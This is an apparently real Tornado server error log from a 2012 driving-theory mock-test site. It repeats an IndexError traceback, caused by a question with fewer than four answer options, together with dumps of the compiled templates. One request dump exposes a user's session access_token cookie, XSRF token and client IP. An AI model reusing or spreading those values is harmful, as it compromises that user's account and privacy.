  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 221.11ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:test/test.html code:
 1  def _execute():  # base.html:0
 2      _buffer = []  # base.html:0
 3      _append = _buffer.append  # base.html:0
 4      _append('<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">\n<!--[if lt IE 7 ]> <html lang="en" class="no-js ie6"> <![endif]-->\n<!--[if IE 7 ]> <html lang="en" class="no-js ie7"> <![endif]-->\n<!--[if IE 8 ]> <html lang="en" class="no-js ie8"> <![endif]-->\n<!--[if IE 9 ]> <html lang="en" class="no-js ie9"> <![endif]-->\n<!--[if (gt IE 9)|!(IE)]><!--> <html lang="en" class="no-js"> <!--<![endif]-->\n<head xmlns="http://www.w3.org/1999/xhtml" xmlns:fb="http://www.facebook.com/2008/fbml">\n<meta charset="utf-8">\n<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">\n<meta name="author" content="intheory">\n<meta name="description" content="Intheory 2012">\n<meta property="og:image" content="http://www.petrominpng.com.pg/images/logo_big.png" />\n<meta name="viewport" content="width=920, initial-scale=auto">\n<meta property="og:type" content="website" />\n<meta property="og:title" content="Intheory 2012" />\n<meta property="og:site_name" content="Intheory 2012" />\n<title>\n')  # base.html:19
 5      _append('\nInTheory | Pass Your Theory Test. Guaranteed.\n')  # base.html:21 (via base.html:19)
 6      _append('\n</title>\n<link href="../static/css/bootstrap.css" rel="stylesheet">\n<link href="../static/css/bootstrap-responsive.css" rel="stylesheet">\n<link rel="stylesheet" href="')  # base.html:25
 7      _tmp = static_url('css/base.css')  # base.html:25
 8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:25
 9      else: _tmp = _utf8(str(_tmp))  # base.html:25
10      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:25
11      _append(_tmp)  # base.html:25
12      _append('" />\n')  # base.html:26
13      for css in kwargs['css_deps']:  # base.html:26
14          _append('\n<link href="')  # base.html:27
15          _tmp = static_url(css)  # base.html:27
16          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:27
17          else: _tmp = _utf8(str(_tmp))  # base.html:27
18          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:27
19          _append(_tmp)  # base.html:27
20          _append('" rel="stylesheet">\n')  # base.html:28
21      _append('\n<style type="text/css">\nhtml{\nbackground-image: url(/static/imgs/background.jpg);\nbackground-repeat: no-repeat;\n}\nbody {\npadding-top: 60px;\npadding-bottom: 40px;\n}\n</style>\n<script type="text/javascript">\nvar _gaq = _gaq || [];\n_gaq.push([\'_setAccount\', \'UA-34526303-1\']);\n_gaq.push([\'_trackPageview\']);\n(function() {\nvar ga = document.createElement(\'script\'); ga.type = \'text/javascript\'; ga.async = true;\nga.src = (\'https:\' == document.location.protocol ? \'https://ssl\' : \'http://www\') + \'.google-analytics.com/ga.js\';\nvar s = document.getElementsByTagName(\'script\')[0]; s.parentNode.insertBefore(ga, s);\n})();\n</script>\n</head>\n<body >\n')  # base.html:56
22      _append('\n<div class="navbar navbar-fixed-top">\n<div class="navbar-inner">\n<div class="container">\n<a class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n<span class="icon-bar"></span>\n</a>\n<a class="brand" href="/"> <img src="')  # base.html:65 (via base.html:56)
23      _tmp = static_url('imgs/logo.png')  # base.html:65 (via base.html:56)
24      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:65 (via base.html:56)
25      else: _tmp = _utf8(str(_tmp))  # base.html:65 (via base.html:56)
26      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:65 (via base.html:56)
27      _append(_tmp)  # base.html:65 (via base.html:56)
28      _append('"></a>\n<div class="pull-right">\n')  # base.html:67 (via base.html:56)
29      if not current_user:  # base.html:67 (via base.html:56)
30          _append('\n<a href="/login"><button type="submit" class="btn btn-success">Sign in</button></a>\n')  # base.html:69 (via base.html:56)
31      else:  # base.html:69 (via base.html:56)
32          _append('\n<ul class="nav nav-pills">\n')  # base.html:71 (via base.html:56)
33          if current_user['moderator']:  # base.html:71 (via base.html:56)
34              _append('\n<li id="admin-nav"><a href="/admin">Admin</a></li>\n')  # base.html:73 (via base.html:56)
35          _append('\n<li class="active"><a href="/learn/main">Learn</a></li>\n<li id="mock-test-nav"><a href="/test/new">Mock Test</a></li>\n<li><a href="#">Book Test</a></li>\n<li><a href="/logout">Logout</a></li>\n<li>|</li>\n</ul>\n<a class="brand1" href="/dashboard"> <img src="')  # base.html:80 (via base.html:56)
36          _tmp = static_url('imgs/user.png')  # base.html:80 (via base.html:56)
37          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:80 (via base.html:56)
38          else: _tmp = _utf8(str(_tmp))  # base.html:80 (via base.html:56)
39          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:80 (via base.html:56)
40          _append(_tmp)  # base.html:80 (via base.html:56)
41          _append('"></a>\n')  # base.html:81 (via base.html:56)
42      _append('\n</div>\n</div>\n</div>\n</div>\n')  # base.html:86 (via base.html:56)
43      _append('\n')  # base.html:88
44      _append('\n<div class="container">\n')  # test/test.html:5 (via base.html:88)
45      test=kwargs['test']  # test/test.html:5 (via base.html:88)
46      _append('\n')  # test/test.html:6 (via base.html:88)
47      _tmp = _modules.Question(test)  # test/test.html:6 (via base.html:88)
48      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # test/test.html:6 (via base.html:88)
49      else: _tmp = _utf8(str(_tmp))  # test/test.html:6 (via base.html:88)
50      _append(_tmp)  # test/test.html:6 (via base.html:88)
51      _append('\n</div>\n')  # test/test.html:8 (via base.html:88)
52      _append('\n')  # base.html:92
53      _tmp = xsrf_form_html()  # base.html:92
54      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:92
55      else: _tmp = _utf8(str(_tmp))  # base.html:92
56      _append(_tmp)  # base.html:92
57      _append('\n')  # base.html:93
58      _append('\n<script src="')  # base.html:94 (via base.html:93)
59      _tmp = static_url('js/libs/jquery-1.7.2.min.js')  # base.html:94 (via base.html:93)
60      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:94 (via base.html:93)
61      else: _tmp = _utf8(str(_tmp))  # base.html:94 (via base.html:93)
62      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:94 (via base.html:93)
63      _append(_tmp)  # base.html:94 (via base.html:93)
64      _append('"></script>\n<script src="')  # base.html:95 (via base.html:93)
65      _tmp = static_url('js/libs/blurb.min.js')  # base.html:95 (via base.html:93)
66      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:95 (via base.html:93)
67      else: _tmp = _utf8(str(_tmp))  # base.html:95 (via base.html:93)
68      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:95 (via base.html:93)
69      _append(_tmp)  # base.html:95 (via base.html:93)
70      _append('"></script>\n<script src="')  # base.html:96 (via base.html:93)
71      _tmp = static_url('js/IT.js')  # base.html:96 (via base.html:93)
72      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:96 (via base.html:93)
73      else: _tmp = _utf8(str(_tmp))  # base.html:96 (via base.html:93)
74      _tmp = _utf8(xhtml_escape(_tmp))  # base.html:96 (via base.html:93)
75      _append(_tmp)  # base.html:96 (via base.html:93)
76      _append('"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-dropdown.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-button.js"></script>\n<script type="text/javascript" src="http://twitter.github.com/bootstrap/assets/js/bootstrap-modal.js"></script>\n')  # base.html:100 (via base.html:93)
77      _append('\n')  # base.html:102
78      for js in kwargs['js_deps']:  # base.html:102
79          _append('\n<script src="')  # base.html:103
80          _tmp = static_url(js)  # base.html:103
81          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # base.html:103
82          else: _tmp = _utf8(str(_tmp))  # base.html:103
83          _tmp = _utf8(xhtml_escape(_tmp))  # base.html:103
84          _append(_tmp)  # base.html:103
85          _append('"></script>\n')  # base.html:104
86      _append('\n')  # base.html:106
87      _append('\n')  # test/test.html:11 (via base.html:106)
88      _append('\n<div class="container">\n<div class="footer"><font color="#FFFFFF" size="2px"> <p class="alignleft">InTheory Media Limited \xc2\xa9 2012</p>\n<p class="alignright">About Us | Terms & Conditions | Privacy Policy | Support </p></font></br>\n</div>\n</div>\n</body>\n</html>\n')  # base.html:118
89      return _utf8('').join(_buffer)  # base.html:0
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
  8      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:5
  9      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:5
 10      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:5
 11      _append(_tmp)  # ui-modules/question.html:5
 12      _append('" />\n<div class="text">\n<div class="verticalalign" style="display: table; height: 100px; #position: relative; overflow: hidden;">\n<div style=" #position: absolute; #top: 50%;display: table-cell; vertical-align: middle;">\n<div class="greenBorder" style=" #position: relative; #top: -50%">\n<p><font color="#FFFFFF"><b>')  # ui-modules/question.html:11
 13      _tmp = question.question  # ui-modules/question.html:11
 14      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:11
 15      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:11
 16      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:11
 17      _append(_tmp)  # ui-modules/question.html:11
 18      _append('</b></font></p>\n</div>\n</div>\n</div>\n</div>\n</div>\n</br></br></br></br></br>\n<div class="progress progress-striped">\n<div class="bar bar-success progress-striped" style="width: ')  # ui-modules/question.html:19
 19      _tmp = 100*test.cursor/len(test.questions)  # ui-modules/question.html:19
 20      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:19
 21      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:19
 22      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:19
 23      _append(_tmp)  # ui-modules/question.html:19
 24      _append('%">\n</div>\n</div>\n')  # ui-modules/question.html:22
 25      if not question.image:  # ui-modules/question.html:22
 26          _append('\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first">')  # ui-modules/question.html:32
 27          _tmp = question.options[0]  # ui-modules/question.html:32
 28          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:32
 29          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:32
 30          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:32
 31          _append(_tmp)  # ui-modules/question.html:32
 32          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second">')  # ui-modules/question.html:36
 33          _tmp = question.options[1]  # ui-modules/question.html:36
 34          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:36
 35          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:36
 36          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:36
 37          _append(_tmp)  # ui-modules/question.html:36
 38          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third">')  # ui-modules/question.html:40
 39          _tmp = question.options[2]  # ui-modules/question.html:40
 40          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:40
 41          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:40
 42          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:40
 43          _append(_tmp)  # ui-modules/question.html:40
 44          _append('</td>\n</tr>\n<tr>\n<td><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth">')  # ui-modules/question.html:44
 45          _tmp = question.options[3]  # ui-modules/question.html:44
 46          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:44
 47          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:44
 48          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:44
 49          _append(_tmp)  # ui-modules/question.html:44
 50          _append('</td>\n</tr>\n</tbody>\n</table>\n')  # ui-modules/question.html:48
 51      else:  # ui-modules/question.html:48
 52          _append('\n<div id="left">\n<div id="object1">\n<table class="table table-hover">\n<thead>\n<tr>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td style="width: 5%; padding-top: 13px;"><center><center><span class="badge badge-info">A</span></center></td>\n<td class="choice first" style="width: 40%; padding-top: 14px;">')  # ui-modules/question.html:61
 53          _tmp = question.options[0]  # ui-modules/question.html:61
 54          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:61
 55          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:61
 56          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:61
 57          _append(_tmp)  # ui-modules/question.html:61
 58          _append('\n</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">B</span></center></td>\n<td class="choice second" style="padding-top: 14px;">')  # ui-modules/question.html:66
 59          _tmp = question.options[1]  # ui-modules/question.html:66
 60          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:66
 61          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:66
 62          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:66
 63          _append(_tmp)  # ui-modules/question.html:66
 64          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">C</span></center></td>\n<td class="choice third" style="padding-top: 14px;">')  # ui-modules/question.html:70
 65          _tmp = question.options[2]  # ui-modules/question.html:70
 66          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:70
 67          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:70
 68          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:70
 69          _append(_tmp)  # ui-modules/question.html:70
 70          _append('</td>\n</tr>\n<tr>\n<td style="padding-top: 13px;"><center><span class="badge badge-info">D</span></center></td>\n<td class="choice fourth" style="padding-top: 14px;">')  # ui-modules/question.html:74
 71          _tmp = question.options[3]  # ui-modules/question.html:74
 72          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:74
 73          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:74
 74          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:74
 75          _append(_tmp)  # ui-modules/question.html:74
 76          _append('</td>\n</tbody>\n</table>\n</div>\n</div>\n<div id="right">\n<div id="object3"><img src="/static/imgs/')  # ui-modules/question.html:81
 77          _tmp = question.image  # ui-modules/question.html:81
 78          if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:81
 79          else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:81
 80          _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:81
 81          _append(_tmp)  # ui-modules/question.html:81
 82          _append('" alt="some_text"/></div>\n</div>\n')  # ui-modules/question.html:83
 83      _append('\n<ul class="pager">\n<li class="previous">\n<a href="#">&larr; Previous</a>\n</li>\n<li class="next" cursor="')  # ui-modules/question.html:89
 84      _tmp = test.cursor  # ui-modules/question.html:89
 85      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 86      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 87      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 88      _append(_tmp)  # ui-modules/question.html:89
 89      _append('" tid="')  # ui-modules/question.html:89
 90      _tmp = test.id  # ui-modules/question.html:89
 91      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 92      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 93      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
 94      _append(_tmp)  # ui-modules/question.html:89
 95      _append('" remaining-answers="')  # ui-modules/question.html:89
 96      _tmp = len(question.answer)  # ui-modules/question.html:89
 97      if isinstance(_tmp, _string_types): _tmp = _utf8(_tmp)  # ui-modules/question.html:89
 98      else: _tmp = _utf8(str(_tmp))  # ui-modules/question.html:89
 99      _tmp = _utf8(xhtml_escape(_tmp))  # ui-modules/question.html:89
100      _append(_tmp)  # ui-modules/question.html:89
101      _append('">\n<a href="#">Next &rarr;</a>\n</li>\n</ul>\n</div>\n</div>\n')  # ui-modules/question.html:100
102      return _utf8('').join(_buffer)  # ui-modules/question.html:0
ERROR:root:Uncaught exception POST /test/evaluate (127.0.0.1)
HTTPRequest(protocol='http', host='www.intheory.co.uk', method='POST', uri='/test/evaluate', version='HTTP/1.0', remote_ip='127.0.0.1', body='tid=5059f3948e4c854802b2dbc3&answers=%5B1%5D&cursor=2&_xsrf=11cac5be243b43cea91e403e51c6a2c4', headers={'Origin': 'http://www.intheory.co.uk', 'Content-Length': '92', 'Accept-Language': 'en-US,en;q=0.8,fr;q=0.6', 'Accept-Encoding': 'gzip,deflate,sdch', 'X-Scheme': 'http', 'Host': 'www.intheory.co.uk', 'Accept': '*/*', 'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_7_4) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.89 Safari/537.1', 'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3', 'Connection': 'close', 'X-Requested-With': 'XMLHttpRequest', 'Referer': 'http://www.intheory.co.uk/test/new', 'X-Real-Ip': '89.105.120.34', 'Cookie': 'access_token="QUFBRzZsTmNzNkdjQkFLOXBwRFpDekVHdTRISGJsWElvMWlONTdFa3IydmlKQzkxRHRHUXk2OGo3TG1idmx3NU5IRHlRWkEyMDZ0SHltWkNrSlFaQTZiT0RXNVlQVURnWkQ=|1348071970|5ad04f2838496896e2949f74560fd9295dc1e1c3"; _xsrf=11cac5be243b43cea91e403e51c6a2c4; __utma=188782963.779422263.1348071853.1348071853.1348071853.1; __utmb=188782963.9.10.1348071853; __utmc=188782963; __utmz=188782963.1348071853.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'})
Traceback (most recent call last):
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 1021, in _execute
    getattr(self, self.request.method.lower())(*args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 102, in post
    self._execute_request(self.on_post, *args, **kwargs)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 221, in _execute_request
    self._execute_on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/base.py", line 226, in _execute_on_success
    self.on_success(*result)
  File "/www/virtualenv/intheory/src/app/handlers/test.py", line 58, in on_success
    self.xhr_response.update({"html": self.render_string("ui-modules/question.html", test=mt)})
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/web.py", line 615, in render_string
    return t.generate(**args)
  File "/www/virtualenv/intheory/lib/python2.7/site-packages/tornado/template.py", line 254, in generate
    return execute()
  File "ui-modules/question_html.generated.py", line 45, in _execute
    _tmp = question.options[3]  # ui-modules/question.html:44
IndexError: list index out of range
ERROR:root:500 POST /test/evaluate (127.0.0.1) 328.69ms
ERROR:root:ui-modules/question.html code:
  1  def _execute():  # ui-modules/question.html:0
  2      _buffer = []  # ui-modules/question.html:0
  3      _append = _buffer.append  # ui-modules/question.html:0
  4      _append('<div class="hero-unit">\n<div class="hero-unit1">\n')  # ui-modules/question.html:4
  5      question = test.questions[test.cursor]  # ui-modules/question.html:4
  6      _append('\n<div class="image123"><img alt="" src="')  # ui-modules/question.html:5
  7      _tmp = static_url('imgs/questionbg.png')  # ui-modules/question.html:5
